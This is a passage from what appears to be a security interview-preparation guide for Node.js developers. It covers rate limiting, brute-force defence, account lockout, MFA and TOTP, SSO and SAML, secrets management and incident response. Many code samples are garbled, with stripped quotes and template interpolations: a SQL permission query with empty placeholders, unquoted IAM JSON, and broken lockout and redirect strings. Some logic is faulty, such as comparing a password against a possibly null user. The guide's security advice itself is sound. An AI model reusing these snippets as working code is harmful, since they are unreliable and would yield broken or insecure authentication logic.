  store: new RedisStore({ client: redisClient, prefix: 'rl:api:' }),
  windowMs: 15 * 60 * 1000,
  max: 100,
  standardHeaders: true,
  legacyHeaders: false
});

// Auth endpoint limit
const authLimiter = rateLimit({
  store: new RedisStore({ client: redisClient, prefix: 'rl:auth:' }),
  windowMs: 15 * 60 * 1000,
  max: 5,
  skipSuccessfulRequests: true,
  keyGenerator: (req) => req.ip + ':' + req.body.email
});

app.use('/api', apiLimiter);
app.use('/api/login', authLimiter);
`

## Key Points:
- Use Redis store for distributed applications
- Configure different limits per endpoint category
- Use standardHeaders for RFC 6585 compliance
- Custom key generators for per-user limits
- Return 429 with Retry-After header
- Log rate limit hits for monitoring

## Interview Tip:
Show per-user and per-IP rate limiting -- it's more sophisticated.

---

## Question: What is a token bucket algorithm?

## Answer:
The token bucket algorithm adds tokens at a fixed rate and removes them for each request. If the bucket is empty, requests are rejected. It allows bursts while maintaining average rate limits.

`javascript
// Token bucket concept
class TokenBucket {
  constructor(capacity, refillRate) {
    this.capacity = capacity;
    this.tokens = capacity;
    this.refillRate = refillRate;
    this.lastRefill = Date.now();
  }
  
  consume() {
    this.refill();
    if (this.tokens > 0) {
      this.tokens--;
      return true;
    }
    return false;
  }
  
  refill() {
    const now = Date.now();
    const elapsed = now - this.lastRefill;
    this.tokens = Math.min(this.capacity, this.tokens + elapsed * this.refillRate);
    this.lastRefill = now;
  }
}
`

## Key Points:
- Adds tokens at fixed rate
- Removes tokens for each request
- Allows bursts up to bucket capacity
- Maintains average rate over time
- More flexible than fixed window
- Used by AWS and other cloud providers

## Interview Tip:
Explain how it handles bursts -- it's a key advantage.

---

## Question: What is a leaky bucket algorithm?

## Answer:
The leaky bucket algorithm processes requests at a fixed rate, queueing excess requests. If the queue is full, requests are rejected. It provides a smooth, constant rate of processing.

`javascript
// Leaky bucket concept
class LeakyBucket {
  constructor(capacity, leakRate) {
    this.capacity = capacity;
    this.water = 0;
    this.leakRate = leakRate;
    this.lastLeak = Date.now();
  }
  
  process() {
    this.leak();
    if (this.water < this.capacity) {
      this.water++;
      return true; // Request processed
    }
    return false; // Request rejected
  }
  
  leak() {
    const now = Date.now();
    const elapsed = now - this.lastLeak;
    this.water = Math.max(0, this.water - elapsed * this.leakRate);
    this.lastLeak = now;
  }
}
`

## Key Points:
- Processes requests at fixed rate
- Queues excess requests
- Rejects when queue is full
- Provides constant processing rate
- Smooths out traffic spikes
- Good for downstream service protection

## Interview Tip:
Know the difference between token bucket (allows bursts) and leaky bucket (constant rate).

---

## Question: How do you prevent brute-force attacks?

## Answer:
I prevent brute-force attacks using rate limiting, account lockout, CAPTCHA, and monitoring. Rate limiting restricts attempts per time window; account lockout temporarily disables accounts after failed attempts.

`javascript
// 1. Rate limiting
app.use('/api/login', rateLimit({ windowMs: 15 * 60 * 1000, max: 5 }));

// 2. Account lockout
async function handleFailedLogin(email) {
  const user = await db.findUserByEmail(email);
  if (!user) return;
  
  const attempts = await db.incrementLoginAttempts(user.id);
  if (attempts >= 5) {
    await db.lockAccount(user.id, 15 * 60 * 1000);
  }
}

// 3. CAPTCHA after failed attempts
app.post('/api/login', async (req, res) => {
  const user = await db.findUserByEmail(req.body.email);
  if (user && user.loginAttempts >= 3) {
    if (!req.body.captcha) {
      return res.status(400).json({ error: 'CAPTCHA required' });
    }
    // Verify CAPTCHA
  }
  // ... authentication logic
});

// 4. Monitor for anomalies
if (loginAttempts > threshold) {
  alertSecurityTeam({ ip: req.ip, email: req.body.email });
}
`

## Key Points:
- Rate limiting on auth endpoints
- Account lockout after failed attempts
- CAPTCHA after suspicious activity
- Monitor for brute-force patterns
- Alert on anomalies
- Use exponential backoff for lockout duration

## Interview Tip:
Layer multiple defenses -- no single method is sufficient.

---

## Question: How do you protect login endpoints?

## Answer:
I protect login endpoints with rate limiting, account lockout, CAPTCHA, input validation, and monitoring. The login endpoint is the most targeted attack surface.

`javascript
// Protected login endpoint
app.post('/api/login',
  rateLimit({ windowMs: 15 * 60 * 1000, max: 5 }),
  validateEmail(req.body.email),
  async (req, res) => {
    // Check account lockout
    const user = await db.findUserByEmail(req.body.email);
    if (user && user.lockedUntil > Date.now()) {
      return res.status(423).json({ error: 'Account locked' });
    }
    
    // Verify credentials
    const isValid = await bcrypt.compare(req.body.password, user.passwordHash);
    if (!isValid) {
      await handleFailedLogin(user.id);
      return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    // Issue tokens
    const accessToken = jwt.sign({ sub: user.id }, secret, { expiresIn: '15m' });
    res.json({ accessToken });
  }
);
`

## Key Points:
- Rate limiting (5 attempts per 15 minutes)
- Account lockout after failed attempts
- CAPTCHA for suspicious activity
- Input validation (email format, password strength)
- Monitor and alert on anomalies
- Don't reveal if email exists (generic error messages)

## Interview Tip:
Don't reveal whether the email or password was wrong.

---

## Question: What is account lockout?

## Answer:
Account lockout temporarily disables an account after too many failed login attempts. I implement progressive lockout with increasing durations.

`javascript
async function handleFailedLogin(userId) {
  const attempts = await db.incrementLoginAttempts(userId);
  
  if (attempts >= 3) {
    // Progressive lockout
    const lockoutDuration = Math.min(attempts * 5 * 60 * 1000, 60 * 60 * 1000);
    await db.lockAccount(userId, lockoutDuration);
    
    // Alert user
    await emailService.send(user.email, 'Your account has been temporarily locked');
  }
}

// Check lockout during login
if (user.lockedUntil > Date.now()) {
  const remaining = Math.ceil((user.lockedUntil - Date.now()) / 60000);
  return res.status(423).json({ error: Account locked. Try again in  minutes });
}
`

## Key Points:
- Temporarily disables account after failed attempts
- Progressive lockout (increasing duration)
- Alert user on lockout
- Provide remaining lockout time
- Reset on successful login
- Consider admin unlock capability

## Interview Tip:
Know progressive lockout -- it's more user-friendly than fixed lockout.

---

## Question: What is CAPTCHA and when should it be used?

## Answer:
CAPTCHA (Completely Automated Public Turing test to tell Computers and Humans Apart) verifies that the user is human. I use it after suspicious activity like multiple failed login attempts.

`javascript
// CAPTCHA verification
const axios = require('axios');

async function verifyCAPTCHA(token, ip) {
  const response = await axios.post('https://www.google.com/recaptcha/api/siteverify', null, {
    params: {
      secret: process.env.RECAPTCHA_SECRET,
      response: token,
      remoteip: ip
    }
  });
  return response.data.success;
}

// Use after suspicious activity
app.post('/api/login', async (req, res) => {
  const user = await db.findUserByEmail(req.body.email);
  if (user && user.loginAttempts >= 3) {
    if (!req.body.captchaToken) {
      return res.status(400).json({ error: 'CAPTCHA required', captchaRequired: true });
    }
    const isHuman = await verifyCAPTCHA(req.body.captchaToken, req.ip);
    if (!isHuman) return res.status(400).json({ error: 'CAPTCHA failed' });
  }
  // ... authentication logic
});
`

## Key Points:
- Verifies user is human
- Use after suspicious activity (not always)
- Google reCAPTCHA or hCaptcha
- Verify server-side with secret key
- Don't use on every request (UX impact)
- Consider accessibility alternatives

## Interview Tip:
Know when to use CAPTCHA -- it's for suspicious activity, not every request.

---

## Question: What attack prevention strategies do you follow?

## Answer:
I follow comprehensive attack prevention: rate limiting, input validation, authentication hardening, security headers, monitoring, and regular security audits.

`javascript
// Comprehensive defense
app.use(helmet()); // Security headers
app.use(rateLimit({ /* ... */ })); // Rate limiting
app.use(authenticate); // Authentication
app.use(validateInput); // Input validation
app.use(csrfProtection); // CSRF protection

// Monitoring
app.use((req, res, next) => {
  const start = Date.now();
  res.on('finish', () => {
    logSecurityEvent(req, res, Date.now() - start);
  });
  next();
});

// Alerting
if (detectAnomaly(req)) {
  alertSecurityTeam(req);
}
`

## Key Points:
- Defense in depth (multiple layers)
- Rate limiting on all endpoints
- Input validation and sanitization
- Authentication hardening (MFA, lockout)
- Security headers (CSP, HSTS, etc.)
- Monitoring and alerting
- Regular security audits

## Interview Tip:
Emphasize defense in depth -- no single solution is sufficient.


---

# Multi-Factor Authentication & Identity (171-180)

## Question: What is Multi-Factor Authentication (MFA)?

## Answer:
MFA requires two or more independent verification factors to confirm identity: knowledge (password), possession (phone/security key), and inherence (biometrics). It dramatically reduces account compromise risk.

`javascript
// TOTP-based MFA
const speakeasy = require('speakeasy');

// Setup
const secret = speakeasy.generateSecret({ name: 'MyApp' });
await db.saveMFAConfig(userId, { secret: secret.base32 });

// Verification
const isVerified = speakeasy.totp.verify({
  secret: user.mfaSecret,
  encoding: 'base32',
  token: inputToken,
  window: 1
});
`

## Key Points:
- Requires 2+ independent factors
- Three categories: knowledge, possession, inherence
- Dramatically reduces account compromise
- TOTP (authenticator apps) is most common
- Hardware keys provide strongest security
- Provide backup codes for recovery

## Interview Tip:
Know the three factor categories and give examples of each.

---

## Question: What are the different MFA methods?

## Answer:
MFA methods include TOTP (authenticator apps), SMS/email codes, hardware security keys (YubiKey), biometrics (fingerprint, face), and push notifications. I choose based on security requirements and user experience.

## Key Points:
- TOTP (authenticator apps): Most common, good security
- SMS/email codes: Convenient but less secure (SIM-swapping)
- Hardware keys (YubiKey): Strongest security
- Biometrics: Convenient, strong security
- Push notifications: Good UX, moderate security

## Interview Tip:
Know the security trade-offs of each method.

---

## Question: How does TOTP-based authentication work?

## Answer:
TOTP generates a 6-digit code every 30 seconds based on a shared secret and current time. The server and client (authenticator app) both have the secret and can independently verify codes.

`javascript
const speakeasy = require('speakeasy');

// Setup: Generate secret
const secret = speakeasy.generateSecret({ name: 'MyApp', length: 20 });
// Show QR code with secret.otpauth_url

// Verification: Check code
const isVerified = speakeasy.totp.verify({
  secret: user.totpSecret,
  encoding: 'base32',
  token: inputCode,
  step: 30, // 30-second window
  window: 1 // Allow 1 step deviation
});
`

## Key Points:
- 6-digit code every 30 seconds
- Based on shared secret and current time
- Server and client independently verify codes
- Window tolerance for clock drift
- Compatible with Google Authenticator, Authy
- No network required for code generation

## Interview Tip:
Explain the time-based algorithm at a high level.

---

## Question: What are authenticator apps?

## Answer:
Authenticator apps generate TOTP codes for MFA. Popular options include Google Authenticator, Authy, and Microsoft Authenticator. They scan QR codes during setup and generate codes offline.

## Key Points:
- Generate TOTP codes for MFA
- Scan QR codes during setup
- Generate codes offline (no network needed)
- Popular: Google Authenticator, Authy, Microsoft Authenticator
- Codes refresh every 30 seconds
- Cross-platform support

## Interview Tip:
Know how QR codes are used for setup.

---

## Question: What are backup codes?

## Answer:
Backup codes are one-time-use codes for account recovery when MFA devices are unavailable. I generate 10-20 codes during MFA setup and store them securely (hashed).

`javascript
// Generate backup codes
const crypto = require('crypto');
const backupCodes = Array.from({ length: 10 }, () => 
  crypto.randomBytes(4).toString('hex').toUpperCase()
);

// Store hashed
const hashedCodes = await Promise.all(
  backupCodes.map(code => bcrypt.hash(code, 10))
);
await db.storeBackupCodes(userId, hashedCodes);

// Use backup code
async function verifyBackupCode(userId, code) {
  const hashedCodes = await db.getBackupCodes(userId);
  for (let i = 0; i < hashedCodes.length; i++) {
    if (await bcrypt.compare(code, hashedCodes[i])) {
      await db.removeBackupCode(userId, i);
      return true;
    }
  }
  return false;
}
`

## Key Points:
- One-time-use codes for recovery
- Generated during MFA setup
- Store hashed (like passwords)
- Remove on use
- Provide to user securely (download/print)
- Last resort for account recovery

## Interview Tip:
Emphasize that backup codes should be stored hashed, not plain text.

---

## Question: How do you securely store MFA secrets?

## Answer:
I store MFA secrets encrypted in the database, never in plain text. For TOTP secrets, I use AES-256-GCM encryption with a key stored in environment variables or a secrets manager.

`javascript
// Encrypt MFA secret before storage
const crypto = require('crypto');
const algorithm = 'aes-256-gcm';
const key = Buffer.from(process.env.MFA_ENCRYPTION_KEY, 'hex');

function encryptSecret(secret) {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv(algorithm, key, iv);
  let encrypted = cipher.update(secret, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  const authTag = cipher.getAuthTag();
  return { encrypted, iv: iv.toString('hex'), authTag: authTag.toString('hex') };
}

// Store in database
await db.saveMFAConfig(userId, {
  secret: encryptSecret(otpauth_url),
  backupCodes: hashedCodes
});
`

## Key Points:
- Encrypt MFA secrets before storage
- Use AES-256-GCM for authenticated encryption
- Encryption key in environment variables or secrets manager
- Never store MFA secrets in plain text
- Backup codes stored hashed
- Regular key rotation

## Interview Tip:
Emphasize encryption -- MFA secrets are as sensitive as passwords.

---

## Question: What is Single Sign-On (SSO)?

## Answer:
SSO allows users to authenticate once and access multiple applications without re-authenticating. I implement SSO using SAML, OIDC, or OAuth 2.0. Users log in once with a central Identity Provider and receive tokens for all connected applications.

`javascript
// SSO flow with OIDC
// 1. User accesses App A -> redirected to Identity Provider
// 2. User authenticates with Identity Provider
// 3. Identity Provider issues tokens
// 4. User accesses App B -> uses same tokens (no re-authentication)
`

## Key Points:
- Authenticate once, access multiple applications
- Uses central Identity Provider
- Protocols: SAML, OIDC, OAuth 2.0
- Improves user experience
- Centralizes authentication management
- Requires trust between IdP and applications

## Interview Tip:
Know the difference between SAML and OIDC for SSO.

---

## Question: How does SSO work?

## Answer:
SSO works by centralizing authentication with an Identity Provider (IdP). When a user accesses an application, they're redirected to the IdP. After authentication, the IdP issues tokens that all connected applications trust.

`javascript
// SSO with OIDC
// 1. User accesses app -> redirected to IdP
const authUrl = https://idp.example.com/authorize?client_id=&redirect_uri=&scope=openid;

// 2. User authenticates with IdP
// 3. IdP redirects back with code
// 4. App exchanges code for tokens
const tokens = await exchangeCode(code);

// 5. User accesses another app
// Uses same IdP session, no re-authentication needed
`

## Key Points:
- Centralized Identity Provider (IdP)
- User authenticates with IdP once
- IdP issues tokens for all applications
- Applications trust the IdP's authentication
- Session maintained at IdP level
- Logout from IdP logs out from all applications

## Interview Tip:
Explain the trust relationship between IdP and applications.

---

## Question: What is SAML?

## Answer:
SAML (Security Assertion Markup Language) is an XML-based standard for exchanging authentication and authorization data between an IdP and Service Provider. It's used for enterprise SSO.

`xml
<!-- SAML assertion example -->
<saml:Assertion>
  <saml:Subject>
    <saml:NameID>user@example.com</saml:NameID>
  </saml:Subject>
  <saml:Conditions>
    <saml:AudienceRestriction>
      <saml:Audience>https://app.example.com</saml:Audience>
    </saml:AudienceRestriction>
  </saml:Conditions>
  <saml:AttributeStatement>
    <saml:Attribute Name=role>
      <saml:AttributeValue>admin</saml:AttributeValue>
    </saml:Attribute>
  </saml:AttributeStatement>
</saml:Assertion>
`

## Key Points:
- XML-based authentication standard
- Used for enterprise SSO
- Exchanges auth data between IdP and Service Provider
- Assertions contain user identity and attributes
- More complex than OIDC
- Still used in enterprise environments

## Interview Tip:
Know when SAML is preferred over OIDC (enterprise vs. modern apps).

---

## Question: What is the difference between SAML and OAuth?

## Answer:
SAML is for authentication (identity verification) using XML; OAuth is for authorization (resource access) using JSON. SAML is enterprise-focused; OAuth is web/mobile-focused. OIDC adds authentication to OAuth, making it more comparable to SAML.

`javascript
// SAML: Authentication (XML-based)
// Used for enterprise SSO
// Complex, verbose, XML-heavy

// OAuth: Authorization (JSON-based)
// Used for API access, social login
// Simpler, modern, widely adopted

// OIDC: Authentication + OAuth
// Modern alternative to SAML
// JSON-based, simpler, more developer-friendly
`

## Key Points:
- SAML: authentication (XML), enterprise-focused
- OAuth: authorization (JSON), web/mobile-focused
- OIDC adds authentication to OAuth
- SAML more complex, OAuth simpler
- Both serve different primary purposes
- OIDC is the modern alternative to SAML

## Interview Tip:
Know when to recommend SAML vs. OIDC based on requirements.


---

# Secrets & Infrastructure Security (181-190)

## Question: What are application secrets?

## Answer:
Application secrets are sensitive configuration values like API keys, database credentials, JWT secrets, and encryption keys. I never store them in source code and use environment variables or secrets managers.

`javascript
// Environment variables
const dbPassword = process.env.DB_PASSWORD;
const jwtSecret = process.env.JWT_SECRET;
const apiKey = process.env.API_KEY;

// NEVER do this
const dbPassword = 'mypassword123'; // Hardcoded in source
`

## Key Points:
- API keys, database credentials, JWT secrets, encryption keys
- Never store in source code
- Use environment variables or secrets managers
- Rotate regularly
- Audit access to secrets
- Different secrets per environment (dev, staging, prod)

## Interview Tip:
Emphasize that secrets in source code are a critical vulnerability.

---

## Question: Why should secrets not be stored in source code?

## Answer:
Secrets in source code are exposed in version control, accessible to all developers, visible in build logs, and impossible to rotate without code changes. If the repository is compromised, all secrets are exposed.

`javascript
// DANGEROUS: Secret in source code
const API_KEY = 'sk_live_abc123'; // In git history forever

// SECURE: Environment variable
const API_KEY = process.env.API_KEY;
`

## Key Points:
- Exposed in version control (git history)
- Accessible to all developers
- Visible in build logs and CI/CD
- Impossible to rotate without code changes
- Repository compromise exposes all secrets
- Compliance violations (GDPR, HIPAA)

## Interview Tip:
Explain the impact -- if the repo is public, all secrets are exposed.

---

## Question: How do you manage environment variables securely?

## Answer:
I manage environment variables using .env files (not committed to git), environment-specific configuration, and secrets managers for production.

`javascript
// .env file (not committed)
DB_PASSWORD=secure_password_here
JWT_SECRET=super_secret_key_here

// Load in application
require('dotenv').config();

// .gitignore
.env
.env.local
.env.*.local
`

## Key Points:
- Use .env files (not committed to git)
- Add .env to .gitignore
- Use different values per environment
- Never log environment variables
- Use secrets managers for production
- Validate required variables on startup

## Interview Tip:
Know the .gitignore configuration -- it's critical.

---

## Question: What is secrets management?

## Answer:
Secrets management is the practice of securely storing, accessing, and rotating sensitive configuration values. I use tools like HashiCorp Vault, AWS Secrets Manager, or Azure Key Vault for production.

`javascript
// AWS Secrets Manager
const { SecretsManagerClient, GetSecretValueCommand } = require('@aws-sdk/client-secrets-manager');

const client = new SecretsManagerClient({ region: 'us-east-1' });
const response = await client.send(new GetSecretValueCommand({ SecretId: 'myapp/db-credentials' }));
const secrets = JSON.parse(response.SecretString);
`

## Key Points:
- Secure storage and access for sensitive values
- Tools: HashiCorp Vault, AWS Secrets Manager, Azure Key Vault
- Automatic rotation capabilities
- Audit logging of secret access
- Centralized management
- Integration with CI/CD pipelines

## Interview Tip:
Name specific tools you've used -- it shows practical experience.

---

## Question: What tools are used for secrets management?

## Answer:
I use HashiCorp Vault for self-hosted, AWS Secrets Manager for AWS, Azure Key Vault for Azure, and Doppler for developer-friendly management. The choice depends on cloud provider and requirements.

## Key Points:
- HashiCorp Vault: self-hosted, feature-rich
- AWS Secrets Manager: AWS integration
- Azure Key Vault: Azure integration
- Doppler: developer-friendly
- 1Password for Teams: small teams
- Choose based on cloud provider and requirements

## Interview Tip:
Know the pros and cons of each tool.

---

## Question: How do you rotate secrets?

## Answer:
I implement automatic secret rotation using secrets managers and database scripts. Rotation involves generating new secrets, updating applications, and invalidating old secrets.

`javascript
// Automatic rotation with AWS Secrets Manager
// Configure rotation Lambda function
// Rotates every 30 days automatically

// Manual rotation
async function rotateDatabasePassword(userId) {
  const newPassword = crypto.randomBytes(32).toString('hex');
  await db.changePassword(userId, newPassword);
  await updateSecretInManager('db-credentials', { password: newPassword });
  await invalidateOldConnections();
}
`

## Key Points:
- Automatic rotation with secrets managers
- Generate new secrets, update applications
- Invalidate old secrets immediately
- Zero-downtime rotation strategies
- Audit rotation events
- Test rotation procedures regularly

## Interview Tip:
Know zero-downtime rotation strategies -- it's critical for production.

---

## Question: How do you secure database credentials?

## Answer:
I secure database credentials by storing them in secrets managers, using environment variables, limiting database user privileges, and rotating passwords regularly.

`javascript
// Secure credential storage
const credentials = await secretsManager.getSecret('db-credentials');
const pool = new Pool({
  host: credentials.host,
  port: credentials.port,
  database: credentials.database,
  user: credentials.username,
  password: credentials.password,
  ssl: { rejectUnauthorized: true }
});

// Limited privileges
// CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'password';
// GRANT SELECT, INSERT, UPDATE, DELETE ON mydb.* TO 'app_user'@'localhost';
// NO GRANT DROP, ALTER, CREATE, etc.
`

## Key Points:
- Store in secrets managers, not source code
- Use environment variables
- Limit database user privileges
- Rotate passwords regularly
- Use SSL for connections
- Audit database access

## Interview Tip:
Emphasize least privilege -- the app user should only have necessary permissions.

---

## Question: How do you secure API keys?

## Answer:
I secure API keys by storing them in environment variables, restricting their scope, rotating regularly, monitoring usage, and never exposing them in client-side code.

`javascript
// Secure API key storage
const apiKey = process.env.API_KEY; // Environment variable

// Never expose in client-side code
// DANGEROUS: <script>const apiKey = 'sk_live_abc123'</script>

// Restrict scope
// API key permissions: read:users, write:users (not admin)

// Monitor usage
if (apiKeyUsage > threshold) {
  alertSecurityTeam();
}
`

## Key Points:
- Store in environment variables
- Restrict scope and permissions
- Rotate regularly
- Never expose in client-side code
- Monitor usage for anomalies
- Use different keys per environment

## Interview Tip:
Never expose API keys in frontend code -- it's a critical vulnerability.

---

## Question: What security practices do you follow in cloud environments?

## Answer:
I follow cloud security best practices: IAM policies, network security, encryption at rest and in transit, monitoring, and compliance.

`javascript
// IAM: Least privilege
{
  Effect: Allow,
  Action: [s3:GetObject, s3:PutObject],
  Resource: arn:aws:s3:::my-bucket/*
}

// Network: VPC, security groups, private subnets
// Encryption: AES-256 for data at rest, TLS for data in transit
// Monitoring: CloudTrail, GuardDuty, CloudWatch
`

## Key Points:
- IAM: Least privilege, MFA for admin
- Network: VPC, security groups, private subnets
- Encryption: At rest and in transit
- Monitoring: CloudTrail, GuardDuty
- Compliance: Regular audits
- Backup: Automated, tested

## Interview Tip:
Know cloud-specific security features (AWS, Azure, GCP).

---

## Question: How do you perform security audits?

## Answer:
I perform security audits using automated scanning tools, manual code reviews, penetration testing, and compliance checks. I audit regularly and after significant changes.

`javascript
// Automated scanning
// npm audit (dependency vulnerabilities)
// Snyk (security scanning)
// SonarQube (code quality and security)

// Manual review checklist
// - Authentication implementation
// - Authorization checks
// - Input validation
// - Error handling
// - Secret management
// - Dependency vulnerabilities

// Penetration testing
// - SQL injection
// - XSS
// - CSRF
// - Authentication bypass
// - Privilege escalation
`

## Key Points:
- Automated scanning (npm audit, Snyk, SonarQube)
- Manual code reviews
- Penetration testing
- Compliance checks (GDPR, HIPAA)
- Regular schedule and after changes
- Document findings and remediation

## Interview Tip:
Have a structured audit process -- it shows thoroughness.


---

# Senior Real-World Security Questions (191-200)

## Question: Describe the most challenging security issue you have solved.

## Answer:
One of the most challenging security issues I solved was a sophisticated account takeover attack that bypassed our existing security measures. The attackers were using credential stuffing with residential proxies to avoid IP-based rate limiting, and they were targeting users with weak or reused passwords.

I implemented a multi-layered defense: behavioral analysis to detect automated login patterns (timing, mouse movements), device fingerprinting to track trusted devices, adaptive MFA that triggered on suspicious activity, and breached password checking using the Have I Been Pwned API. We also implemented proof-of-work challenges for suspicious login attempts.

The key lesson was that no single security measure is sufficient -- defense in depth is essential. We combined technical controls (rate limiting, MFA) with behavioral analysis and user education.

## Key Points:
- Attackers used residential proxies to bypass IP rate limiting
- Implemented behavioral analysis and device fingerprinting
- Added adaptive MFA triggered by suspicious activity
- Used breached password checking (HIBP API)
- Defense in depth is essential
- Technical controls + behavioral analysis + user education

## Interview Tip:
Tell a story with a clear problem, approach, and resolution -- it demonstrates experience.

---

## Question: How do you perform a security review of an application?

## Answer:
I perform security reviews systematically: threat modeling, code review, dependency scanning, configuration review, and penetration testing. I start by identifying assets and attack vectors, then review code for common vulnerabilities, scan dependencies for known CVEs, and test for OWASP Top 10 risks.

`javascript
// Security review checklist
// 1. Threat modeling
// - Identify assets (user data, financial data)
// - Identify threats (SQL injection, XSS, CSRF)
// - Identify controls (authentication, authorization, encryption)

// 2. Code review
// - Authentication implementation
// - Authorization checks
// - Input validation
// - Error handling
// - Secret management

// 3. Dependency scanning
// npm audit
// snyk test

// 4. Configuration review
// - Security headers
// - CORS configuration
// - Rate limiting
// - Logging

// 5. Penetration testing
// - SQL injection
// - XSS
// - CSRF
// - Authentication bypass
`

## Key Points:
- Systematic approach: threat modeling, code review, scanning, testing
- Identify assets and attack vectors
- Review for OWASP Top 10 risks
- Scan dependencies for CVEs
- Test configuration and headers
- Document findings and remediation

## Interview Tip:
Have a structured process -- it shows thoroughness and experience.

---

## Question: How do you secure a full-stack Next.js + Node.js application?

## Answer:
I secure full-stack applications with multiple layers: authentication with NextAuth.js, authorization middleware, API route protection, security headers, input validation, and database security.

`javascript
// NextAuth.js configuration
import NextAuth from 'next-auth';
import GitHub from 'next-auth/providers/github';
import { PrismaAdapter } from '@auth/prisma-adapter';

export default NextAuth({
  adapter: PrismaAdapter(prisma),
  providers: [GitHub({ clientId, clientSecret })],
  session: { strategy: 'jwt' },
  callbacks: {
    async jwt({ token, user }) {
      if (user) token.role = user.role;
      return token;
    }
  }
});

// API route protection
// pages/api/protected.ts
import { getServerSession } from 'next-auth';

export default async function handler(req, res) {
  const session = await getServerSession(req, res, authOptions);
  if (!session) return res.status(401).json({ error: 'Unauthorized' });
  
  // Authorization check
  if (session.user.role !== 'admin') {
    return res.status(403).json({ error: 'Forbidden' });
  }
  
  res.json({ data: 'protected data' });
}

// next.config.js security headers
const securityHeaders = [
  { key: 'X-Frame-Options', value: 'DENY' },
  { key: 'X-Content-Type-Options', value: 'nosniff' },
  { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
  { key: 'Content-Security-Policy', value: default-src 'self'; script-src 'self' }
];
`

## Key Points:
- NextAuth.js for authentication
- JWT strategy for session management
- API route protection with session validation
- Authorization middleware for role-based access
- Security headers in next.config.js
- Input validation on API routes
- Database security (Prisma, parameterized queries)

## Interview Tip:
Know the specific security features of Next.js and how to implement them.

---

## Question: How would you design authentication for a SaaS platform?

## Answer:
I design SaaS authentication with multi-tenancy, SSO, role-based access, and tenant isolation. Each tenant has isolated data, and users can belong to multiple tenants with different roles.

`javascript
// Multi-tenant authentication
// Schema
model Tenant { id String; name String; users User[] }
model User { id String; email String; tenantId String; role String }
model TenantMembership { userId String; tenantId String; role String }

// Authentication flow
// 1. User authenticates (email/password or SSO)
// 2. System determines tenant(s) user belongs to
// 3. User selects tenant context
// 4. JWT includes tenantId and role for selected tenant
// 5. All queries scoped to tenant

const token = jwt.sign({
  sub: user.id,
  tenantId: selectedTenant.id,
  role: membership.role
}, secret, { expiresIn: '1h' });

// Tenant isolation middleware
app.use('/api', (req, res, next) => {
  req.tenantId = req.user.tenantId;
  next();
});

// All queries scoped to tenant
const posts = await db.post.findMany({ where: { tenantId: req.tenantId } });
`

## Key Points:
- Multi-tenant isolation (data, authentication)
- SSO support for enterprise customers
- Role-based access per tenant
- Tenant context in JWT
- Data queries scoped to tenant
- Tenant administration features
- Audit logging per tenant

## Interview Tip:
Explain tenant isolation -- it's the critical SaaS security concern.

---

## Question: How would you design a role-based permission system?

## Answer:
I design permission systems with a clear hierarchy: users -> roles -> permissions -> resources. I use database tables for flexibility and implement middleware for enforcement.

`javascript
// Database schema
CREATE TABLE users (id SERIAL PRIMARY KEY, email VARCHAR UNIQUE);
CREATE TABLE roles (id SERIAL PRIMARY KEY, name VARCHAR UNIQUE);
CREATE TABLE permissions (id SERIAL PRIMARY KEY, name VARCHAR UNIQUE, resource VARCHAR, action VARCHAR);
CREATE TABLE user_roles (user_id INT, role_id INT);
CREATE TABLE role_permissions (role_id INT, permission_id INT);

// Permission check middleware
function requirePermission(resource, action) {
  return async (req, res, next) => {
    const hasPermission = await db.query(
      SELECT 1 FROM users u
      JOIN user_roles ur ON u.id = ur.user_id
      JOIN role_permissions rp ON ur.role_id = rp.role_id
      JOIN permissions p ON rp.permission_id = p.id
      WHERE u.id =  AND p.resource =  AND p.action = 
    , [req.user.id, resource, action]);
    
    if (!hasPermission.rows.length) {
      return res.status(403).json({ error: 'Permission denied' });
    }
    next();
  };
}

// Usage
app.delete('/api/posts/:id', requirePermission('posts', 'delete'), deletePost);
app.get('/api/reports', requirePermission('reports', 'read'), getReports);
`

## Key Points:
- Clear hierarchy: users -> roles -> permissions -> resources
- Database tables for flexibility
- Middleware for enforcement
- Support hierarchical roles
- Audit permission changes
- Admin interface for management

## Interview Tip:
Draw the database schema -- it shows practical design skills.

---

## Question: How would you secure a payment application?

## Answer:
I secure payment applications with PCI DSS compliance, tokenization, encryption, fraud detection, and comprehensive logging. I never store raw card data -- I use payment processors like Stripe that handle PCI compliance.

`javascript
// PCI DSS compliance
// 1. Never store raw card data
// Use Stripe/PayPal for payment processing

// 2. Tokenization
const paymentIntent = await stripe.paymentIntents.create({
  amount: 1000,
  currency: 'usd',
  payment_method: paymentMethodId,
});

// 3. Encryption at rest and in transit
// TLS for all communication
// AES-256 for sensitive data at rest

// 4. Fraud detection
const radarResult = await stripe.radar.earlyFraudWarnings.list();
if (radarResult.data.length > 0) {
  await handleFraudAlert(radarResult.data[0]);
}

// 5. Comprehensive logging
auditLog({
  action: 'payment',
  amount: 1000,
  userId: req.user.id,
  ip: req.ip,
  timestamp: new Date()
});
`

## Key Points:
- PCI DSS compliance
- Never store raw card data (use tokenization)
- Encryption at rest and in transit
- Fraud detection and prevention
- Comprehensive audit logging
- Regular security audits

## Interview Tip:
Emphasize that you never handle raw card data -- it's a critical PCI requirement.

---

## Question: How would you handle a production data breach?

## Answer:
I follow an incident response plan: identify, contain, eradicate, recover, and learn. I immediately assess the scope, contain the breach, notify affected parties, and implement measures to prevent recurrence.

`javascript
// Incident response plan
// 1. Identify
// - Monitor alerts and logs
// - Determine scope and impact

// 2. Contain
// - Isolate affected systems
// - Revoke compromised credentials
// - Block malicious IPs

// 3. Eradicate
// - Remove malware/backdoors
// - Patch vulnerabilities
// - Reset all affected credentials

// 4. Recover
// - Restore from clean backups
// - Verify system integrity
// - Monitor for recurrence

// 5. Learn
// - Post-mortem analysis
// - Update security measures
// - Improve detection capabilities
// - Notify affected users (within 72 hours for GDPR)
`

## Key Points:
- Follow incident response plan
- Identify, contain, eradicate, recover, learn
- Immediate assessment and containment
- Notify affected parties (GDPR: 72 hours)
- Post-mortem analysis
- Update security measures
- Improve detection capabilities

## Interview Tip:
Have a clear incident response plan -- it shows preparedness.

---

## Question: What security practices do you implement before deploying to production?

## Answer:
Before production deployment, I run security scans, review code changes, verify secrets management, test authentication and authorization, check security headers, and validate HTTPS configuration.

`javascript
// Pre-deployment checklist
// 1. Security scanning
npm audit
snyk test
sonarqube scan

// 2. Code review
